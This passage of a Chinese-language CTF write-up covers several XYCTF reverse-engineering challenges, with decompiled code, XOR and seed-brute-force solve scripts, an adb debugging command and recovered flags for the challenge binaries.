<span class="number">4</span>Ch</span><br><span class="line">seg001:<span class="number">005</span>C                 int     <span class="number">21</span>h             ; DOS - <span class="number">2</span>+ - QUIT WITH EXIT <span class="title function_ invoke__">CODE</span> (EXIT)</span><br><span class="line">seg001:<span class="number">005</span>C start           endp                    ; AL = exit code</span><br><span class="line">seg001:<span class="number">005</span>C</span><br><span class="line">seg001:<span class="number">005</span>C seg001          ends</span><br></pre></td></tr></table></figure><p>没有找到其他方法，硬读汇编qwq<br>输入—-每一位与后面一位异或—–与d数组比对。<br>#看到说是循环异或</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240428202306830.png" alt="image-20240428202306830"></p><p>解密：（最后一个没出，但是可能和第一个异或？</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cipher = [<span class="number">0x76</span>, <span class="number">0x0E</span>, <span class="number">0x77</span>, <span class="number">0x14</span>, <span class="number">0x60</span>, <span class="number">0x06</span>, <span class="number">0x7D</span>, <span class="number">0x04</span>, <span class="number">0x6B</span>, <span class="number">0x1E</span>, <span class="number">0x41</span>,</span><br><span class="line"><span class="number">0x2A</span>, <span class="number">0x44</span>, <span class="number">0x2B</span>, <span class="number">0x5C</span>, <span class="number">0x03</span>, <span class="number">0x3B</span>, <span class="number">0x0B</span>, <span class="number">0x33</span>, <span class="number">0x05</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher) - <span class="number">1</span>):</span><br><span class="line">cipher[i] = cipher[i] ^ cipher[i + <span class="number">1</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#print(flag)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line"><span class="keyword">if</span> i != (<span class="built_in">len</span>(cipher) - <span class="number">1</span>):</span><br><span class="line">flag += <span class="built_in">chr</span>(cipher[i])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">flag += <span class="built_in">chr</span>(cipher[i] ^ cipher[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># xyctf&#123;you_know_8086&#125;#又是8086</span></span><br></pre></td></tr></table></figure><p>#放个16位<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240428204644536.png" alt="image-20240428204644536"></p><h2 id="2-Debugme"><a href="#2-Debugme" class="headerlink" title="2.Debugme"></a>2.Debugme</h2><h5 id="动态调试apk"><a href="#动态调试apk" class="headerlink" title="动态调试apk"></a>动态调试apk</h5><p>说是动态调试apk</p><blockquote><p><a href="http://t.csdnimg.cn/Xk9op">http://t.csdnimg.cn/Xk9op</a><br>1、jeb打开apk，分析源码，下好断点；<br> 2、启动模拟器，安装好apk；<br> 3、adb命令连接模拟器，启动apk，adb shell am start -D -n （包名）&#x2F;（.主窗体）<br> 4、jeb附加对应的进程，开始愉快的调试。</p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am <span class="built_in">start</span> -D -n com.xyctf.ezapk/.MainActivity</span><br></pre></td></tr></table></figure><h2 id="3-Trustme"><a href="#3-Trustme" class="headerlink" title="3.*Trustme"></a>3.*Trustme</h2><h5 id=""><a href="#" class="headerlink" title=""></a></h5><p>#放个jadx支持的文件种类：apk、dex、jar、zip、class、aar</p><p><a href="http://t.csdnimg.cn/35N5aadb%E8%BF%9E%E6%8E%A5MuMu%E3%80%81%E9%80%8D%E9%81%A5%E3%80%81%E5%A4%9C%E7%A5%9E%E3%80%81%E9%9B%B7%E7%94%B5%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%BB%A5%E5%8F%8A%E8%85%BE%E8%AE%AF%E6%89%8B%E6%B8%B8%E5%8A%A9%E6%89%8B%E4%BB%A5%E5%8F%8A%E6%96%AD%E5%BC%80%E8%BF%9E%E6%8E%A5_%E9%9B%B7%E7%94%B5adb%E8%BF%9E%E6%8E%A5%E5%9C%B0%E5%9D%80-CSDN%E5%8D%9A%E5%AE%A2">http://t.csdnimg.cn/35N5aadb连接MuMu、逍遥、夜神、雷电模拟器以及腾讯手游助手以及断开连接_雷电adb连接地址-CSDN博客</a></p><p>？放一下</p><h2 id="4-ez-cube"><a href="#4-ez-cube" class="headerlink" title="4.ez_cube"></a>4.ez_cube</h2><h5 id="模拟-拧魔方？"><a href="#模拟-拧魔方？" class="headerlink" title="模拟+拧魔方？"></a>模拟+拧魔方？</h5><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240428222750041.png" alt="image-20240428222750041"></p><p>分别是面颜色–现在状态–操作行为</p><p>#拿着魔方拧一下</p><p>cmp函数是验证是否复原，以及复原步骤是否&lt;&#x3D;12</p><p>拿魔方手操：RuRURURuruRR</p><h2 id="5-今夕是何年"><a href="#5-今夕是何年" class="headerlink" title="5.今夕是何年"></a>5.今夕是何年</h2><h5 id="龙芯loongarch"><a href="#龙芯loongarch" class="headerlink" title="龙芯loongarch"></a>龙芯loongarch</h5><p>#<img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240428222956978.png" alt="image-20240428222956978"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240428223006225.png" alt="image-20240428223006225"></p><h2 id="6-baby-unity"><a href="#6-baby-unity" class="headerlink" title="6.*baby unity"></a>6.*baby unity</h2><p>好难</p><h2 id="7-ez-rand"><a href="#7-ez-rand" class="headerlink" title="7.ez_rand"></a>7.ez_rand</h2><h5 id="随机数种子"><a href="#随机数种子" class="headerlink" title="随机数种子"></a>随机数种子</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v4; <span class="comment">// ax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// edi</span></span><br><span class="line">  __int64 v6; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v9[<span class="number">7</span>]; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [rsp+3Ch] [rbp-34h]</span></span><br><span class="line">  __int16 v11; <span class="comment">// [rsp+3Dh] [rbp-33h]</span></span><br><span class="line">  __int128 v12; <span class="comment">// [rsp+40h] [rbp-30h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+50h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line">  __int16 v15; <span class="comment">// [rsp+5Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// [rsp+5Eh] [rbp-12h]</span></span><br><span class="line"></span><br><span class="line">  v13 = <span class="number">0</span>i64;</span><br><span class="line">  v12 = <span class="number">0</span>i64;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  sub_140001020(<span class="string">&quot;请输入flag:&quot;</span>);</span><br><span class="line">  sub_140001080(<span class="string">&quot;%s&quot;</span>);</span><br><span class="line">  v9[<span class="number">0</span>] = <span class="number">0xEA6C0C5D</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">-1</span>i64;</span><br><span class="line">  v9[<span class="number">1</span>] = <span class="number">0x34FC1946</span>;</span><br><span class="line">  v9[<span class="number">2</span>] = <span class="number">0x72362B2</span>;</span><br><span class="line">  v9[<span class="number">3</span>] = <span class="number">0xFB6E2262</span>;</span><br><span class="line">  v9[<span class="number">4</span>] = <span class="number">0xA9F2E8B4</span>;</span><br><span class="line">  v9[<span class="number">5</span>] = <span class="number">0x86211291</span>;</span><br><span class="line">  v9[<span class="number">6</span>] = <span class="number">0x43E98EDB</span>;</span><br><span class="line">  v10 = <span class="number">77</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v3;</span><br><span class="line">  <span class="keyword">while</span> ( *((_BYTE *)&amp;v12 + v3) );</span><br><span class="line">  v4 = time64(<span class="number">0</span>i64);</span><br><span class="line">  srand(v4);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = rand();</span><br><span class="line">      <span class="keyword">if</span> ( (*((_BYTE *)&amp;v12 + v6) ^ (<span class="type">unsigned</span> __int8)(v7</span><br><span class="line">                                                    + ((((<span class="type">unsigned</span> __int64)(<span class="number">2155905153</span>i64 * v7) &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0x80000000</span>) != <span class="number">0</span>i64)</span><br><span class="line">                                                    + ((<span class="type">int</span>)((<span class="type">unsigned</span> __int64)(<span class="number">2155905153</span>i64 * v7) &gt;&gt; <span class="number">32</span>) &gt;&gt; <span class="number">7</span>))) != *((_BYTE *)v9 + v6) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_140001020(<span class="string">&quot;Error???\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      ++v5;</span><br><span class="line">      ++v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v5 &lt; v3 );</span><br><span class="line">  &#125;</span><br><span class="line">  sub_140001020(<span class="string">&quot;Right???\n&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>v4是种子，srand函数和rand函数根据种子来生成随机数，input加密逻辑使用v7</p><p>那么首先想到的是爆破种子，来推flag</p><p>再看v4，<strong>unsigned __int16 v4</strong>无符号16位整数型，v4范围为0~2**16-1(65535)，结合flag固定格式</p><p>XYCTF{}</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">containsXYCTF</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(str, <span class="string">&quot;XYCTF&quot;</span>) != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 包含&quot;XYCTF&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 不包含&quot;XYCTF&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> cipher[<span class="number">29</span>] = &#123;<span class="number">0x5D</span>, <span class="number">0x0C</span>, <span class="number">0x6C</span>, <span class="number">0xEA</span>, <span class="number">0x46</span>, <span class="number">0x19</span>, <span class="number">0xFC</span>, <span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xB2</span>, <span class="number">0x62</span>, <span class="number">0x23</span>, <span class="number">0x07</span>, <span class="number">0x62</span>, <span class="number">0x22</span>, <span class="number">0x6E</span>, <span class="number">0xFB</span>, <span class="number">0xB4</span>, <span class="number">0xE8</span>, <span class="number">0xF2</span>, <span class="number">0xA9</span>, <span class="number">0x91</span>,</span><br><span class="line"><span class="number">0x12</span>, <span class="number">0x21</span>, <span class="number">0x86</span>, <span class="number">0xDB</span>, <span class="number">0x8E</span>, <span class="number">0xE9</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v7;</span><br><span class="line"><span class="type">char</span> flag[<span class="number">29</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> seed = <span class="number">0</span>; seed &lt; <span class="number">65536</span>; seed++)</span><br><span class="line">&#123;</span><br><span class="line">srand(seed);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">29</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">v7 = rand();</span><br><span class="line"><span class="type">int</span> num = (<span class="type">int</span>)((<span class="type">unsigned</span> __int64)(<span class="number">2155905153</span> * v7) &gt;&gt; <span class="number">32</span>);</span><br><span class="line"><span class="type">unsigned</span> __int8 data = (<span class="type">unsigned</span> __int8)(v7 + ((num &amp; <span class="number">0x80000000</span>) !=</span><br><span class="line"><span class="number">0</span>) + (num &gt;&gt; <span class="number">7</span>));</span><br><span class="line">flag[i] = cipher[i] ^ data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (containsXYCTF(flag))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;success\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;seed = %d\n&quot;</span>, seed);</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// seed = 21308</span></span><br><span class="line"><span class="comment">// XYCTF&#123;R@nd_1s_S0_S0_S0_easy!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="8-何须相思煮余年"><a href="#8-何须相思煮余年" class="headerlink" title="8.何须相思煮余年"></a>8.何须相思煮余年</h2><h5 id="转汇编，去花指令"><a href="#转汇编，去花指令" class="headerlink" title="转汇编，去花指令"></a>转汇编，去花指令</h5><p>一堆十六进制应该是要转汇编</p><p>朝的脚本转二进制：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">hex_data = <span class="string">&quot;0x55 0x8b 0xec 0x81 0xec 0xa8 0x0 0x0 0x0 0xa1 0x0 0x40 0x41 0x0</span></span><br><span class="line"><span class="string">0x33 0xc5 0x89 0x45 0xfc 0x68 0x9c 0x0 0x0 0x0 0x6a 0x0 0x8d 0x85 0x60 0xff 0xff</span></span><br><span class="line"><span class="string">0xff 0x50 0xe8 0x7a 0xc 0x0 0x0 0x83 0xc4 0xc 0xc7 0x85 0x58 0xff 0xff 0xff 0x27</span></span><br><span class="line"><span class="string">0x0 0x0 0x0 0xc7 0x85 0x5c 0xff 0xff 0xff 0x0 0x0 0x0 0x0 0xeb 0xf 0x8b 0x8d 0x5c</span></span><br><span class="line"><span class="string">0xff 0xff 0xff 0x83 0xc1 0x1 0x89 0x8d 0x5c 0xff 0xff 0xff 0x83 0xbd 0x5c 0xff</span></span><br><span class="line"><span class="string">0xff 0xff 0x27 0xf 0x8d 0xed 0x0 0x0 0x0 0x8b 0x95 0x5c 0xff 0xff 0xff 0x81 0xe2</span></span><br><span class="line"><span class="string">0x3 0x0 0x0 0x80 0x79 0x5 0x4a 0x83 0xca 0xfc 0x42 0x85 0xd2 0x75 0x25 0x8b 0x85</span></span><br><span class="line"><span class="string">0x5c 0xff 0xff 0xff 0x8b 0x8c 0x85 0x60 0xff 0xff 0xff 0x3 0x8d 0x5c 0xff 0xff</span></span><br><span class="line"><span class="string">0xff 0x8b 0x95 0x5c 0xff 0xff 0xff 0x89 0x8c 0x95 0x60 0xff 0xff 0xff 0xe9 0xac</span></span><br><span class="line"><span class="string">0x0 0x0 0x0 0x8b 0x85 0x5c 0xff 0xff 0xff 0x25 0x3 0x0 0x0 0x80 0x79 0x5 0x48</span></span><br><span class="line"><span class="string">0x83 0xc8 0xfc 0x40 0x83 0xf8 0x1 0x75 0x22 0x8b 0x8d 0x5c 0xff 0xff 0xff 0x8b</span></span><br><span class="line"><span class="string">0x94 0x8d 0x60 0xff 0xff 0xff 0x2b 0x95 0x5c 0xff 0xff 0xff 0x8b 0x85 0x5c 0xff</span></span><br><span class="line"><span class="string">0xff 0xff 0x89 0x94 0x85 0x60 0xff 0xff 0xff 0xeb 0x73 0x8b 0x8d 0x5c 0xff 0xff</span></span><br><span class="line"><span class="string">0xff 0x81 0xe1 0x3 0x0 0x0 0x80 0x79 0x5 0x49 0x83 0xc9 0xfc 0x41 0x83 0xf9 0x2</span></span><br><span class="line"><span class="string">0x75 0x23 0x8b 0x95 0x5c 0xff 0xff 0xff 0x8b 0x84 0x95 0x60 0xff 0xff 0xff 0xf</span></span><br><span class="line"><span class="string">0xaf 0x85 0x5c 0xff 0xff 0xff 0x8b 0x8d 0x5c 0xff 0xff 0xff 0x89 0x84 0x8d 0x60</span></span><br><span class="line"><span class="string">0xff 0xff 0xff 0xeb 0x38 0x8b 0x95 0x5c 0xff 0xff 0xff 0x81 0xe2 0x3 0x0 0x0 0x80</span></span><br><span class="line"><span class="string">0x79 0x5 0x4a 0x83 0xca 0xfc 0x42 0x83 0xfa 0x3 0x75 0x20 0x8b 0x85 0x5c 0xff</span></span><br><span class="line"><span class="string">0xff 0xff 0x8b 0x8c 0x85 0x60 0xff 0xff 0xff 0x33 0x8d 0x5c 0xff 0xff 0xff 0x8b</span></span><br><span class="line"><span class="string">0x95 0x5c 0xff 0xff 0xff 0x89 0x8c 0x95 0x60 0xff 0xff 0xff 0xe9 0xf7 0xfe 0xff</span></span><br><span class="line"><span class="string">0xff 0x33 0xc0 0x8b 0x4d 0xfc 0x33 0xcd 0xe8 0x4 0x0 0x0 0x0 0x8b 0xe5 0x5d</span></span><br><span class="line"><span class="string">0xc3&quot;</span></span><br><span class="line"><span class="comment"># 去除空格并将十六进制数据字符串分割成十六进制值的列表</span></span><br><span class="line">hex_values = hex_data.split()</span><br><span class="line"><span class="comment"># 将每个十六进制值转换为相应的整数值</span></span><br><span class="line">int_values = [<span class="built_in">int</span>(value, <span class="number">16</span>) <span class="keyword">for</span> value <span class="keyword">in</span> hex_values]</span><br><span class="line"><span class="comment"># 将整数值列表转换为字节</span></span><br><span class="line">binary_data = <span class="built_in">bytes</span>(int_values)</span><br><span class="line"><span class="comment"># 将二进制数据写入文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(binary_data)</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">code =</span><br><span class="line"><span class="string">b&#x27;\x55\x8b\xec\x81\xec\xa8\x00\x00\x00\xa1\x00\x40\x41\x00\x33\xc5\x89\x</span></span><br><span class="line"><span class="string">45\xfc\x68\x9c\x00\x00\x00\x6a\x00\x8d\x85\x60\xff\xff\xff\x50\xe8\x7a\x</span></span><br><span class="line"><span class="string">0c\x00\x00\x83\xc4\x0c\xc7\x85\x58\xff\xff\xff\x27\x00\x00\x00\xc7\x85\x</span></span><br><span class="line"><span class="string">5c\xff\xff\xff\x00\x00\x00\x00\xeb\x0f\x8b\x8d\x5c\xff\xff\xff\x83\xc1\x</span></span><br><span class="line"><span class="string">01\x89\x8d\x5c\xff\xff\xff\x83\xbd\x5c\xff\xff\xff\x27\x0f\x8d\xed\x00\x</span></span><br><span class="line"><span class="string">00\x00\x8b\x95\x5c\xff\xff\xff\x81\xe2\x03\x00\x00\x80\x79\x05\x4a\x83\x</span></span><br><span class="line"><span class="string">ca\xfc\x42\x85\xd2\x75\x25\x8b\x85\x5c\xff\xff\xff\x8b\x8c\x85\x60\xff\x</span></span><br><span class="line"><span class="string">ff\xff\x03\x8d\x5c\xff\xff\xff\x8b\x95\x5c\xff\xff\xff\x89\x8c\x95\x60\x</span></span><br><span class="line"><span class="string">ff\xff\xff\xe9\xac\x00\x00\x00\x8b\x85\x5c\xff\xff\xff\x25\x03\x00\x00\x</span></span><br><span class="line"><span class="string">80\x79\x05\x48\x83\xc8\xfc\x40\x83\xf8\x01\x75\x22\x8b\x8d\x5c\xff\xff\x</span></span><br><span class="line"><span class="string">ff\x8b\x94\x8d\x60\xff\xff\xff\x2b\x95\x5c\xff\xff\xff\x8b\x85\x5c\xff\x</span></span><br><span class="line"><span class="string">ff\xff\x89\x94\x85\x60\xff\xff\xff\xeb\x73\x8b\x8d\x5c\xff\xff\xff\x81\x</span></span><br><span class="line"><span class="string">e1\x03\x00\x00\x80\x79\x05\x49\x83\xc9\xfc\x41\x83\xf9\x02\x75\x23\x8b\x</span></span><br><span class="line"><span class="string">95\x5c\xff\xff\xff\x8b\x84\x95\x60\xff\xff\xff\x0f\xaf\x85\x5c\xff\xff\x</span></span><br><span class="line"><span class="string">ff\x8b\x8d\x5c\xff\xff\xff\x89\x84\x8d\x60\xff\xff\xff\xeb\x38\x8b\x95\x</span></span><br><span class="line"><span class="string">5c\xff\xff\xff\x81\xe2\x03\x00\x00\x80\x79\x05\x4a\x83\xca\xfc\x42\x83\x</span></span><br><span class="line"><span class="string">fa\x03\x75\x20\x8b\x85\x5c\xff\xff\xff\x8b\x8c\x85\x60\xff\xff\xff\x33\x</span></span><br><span class="line"><span class="string">8d\x5c\xff\xff\xff\x8b\x95\x5c\xff\xff\xff\x89\x8c\x95\x60\xff\xff\xff\x</span></span><br><span class="line"><span class="string">e9\xf7\xfe\xff\xff\x33\xc0\x8b\x4d\xfc\x33\xcd\xe8\x04\x00\x00\x00\x8b\x</span></span><br><span class="line"><span class="string">e5\x5d\xc3&#x27;</span></span><br><span class="line">assembly = disasm(code)</span><br><span class="line"><span class="built_in">print</span>(assembly)</span><br><span class="line"><span class="comment">#这个直接读汇编出exp？</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240429004853677.png" alt="image-20240429004853677"></p><p>这里的call和下面的call的地址一眼假，当作花指令nop掉</p><p>u、p操作复原函数</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240429005643337.png" alt="image-20240429005643337"><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240429005753142.png" alt="image-20240429005753142"></p><p>EXP:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cipher = [<span class="number">88</span>, <span class="number">88</span>, <span class="number">134</span>, <span class="number">87</span>, <span class="number">74</span>, <span class="number">118</span>, <span class="number">318</span>, <span class="number">101</span>, <span class="number">59</span>, <span class="number">92</span>, <span class="number">480</span>, <span class="number">60</span>, <span class="number">65</span>, <span class="number">41</span>, <span class="number">770</span>, <span class="number">110</span>,</span><br><span class="line"><span class="number">73</span>, <span class="number">31</span>, <span class="number">918</span>, <span class="number">39</span>, <span class="number">120</span>, <span class="number">27</span>, <span class="number">1188</span>, <span class="number">47</span>, <span class="number">77</span>,</span><br><span class="line"><span class="number">24</span>, <span class="number">1352</span>, <span class="number">44</span>, <span class="number">81</span>, <span class="number">23</span>, <span class="number">1680</span>, <span class="number">46</span>, <span class="number">85</span>, <span class="number">15</span>, <span class="number">1870</span>, <span class="number">66</span>, <span class="number">91</span>, <span class="number">16</span>, <span class="number">4750</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line"><span class="keyword">if</span> i % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">flag += <span class="built_in">chr</span>(cipher[i] - i)</span><br><span class="line"><span class="keyword">elif</span> i % <span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">flag += <span class="built_in">chr</span>(cipher[i] + i)</span><br><span class="line"><span class="keyword">elif</span> i % <span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(cipher[i] / i))</span><br><span class="line"><span class="keyword">elif</span> i % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">flag += <span class="built_in">chr</span>(cipher[i] ^ i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># XYCTF&#123;5b3e07567a9034d06851475481507a75&#125;</span></span><br></pre></td></tr></table></figure><h2 id="9-砸核桃"><a href="#9-砸核桃" class="headerlink" title="9.砸核桃"></a>9.砸核桃</h2><h5 id="NsPack壳儿"><a href="#NsPack壳儿" class="headerlink" 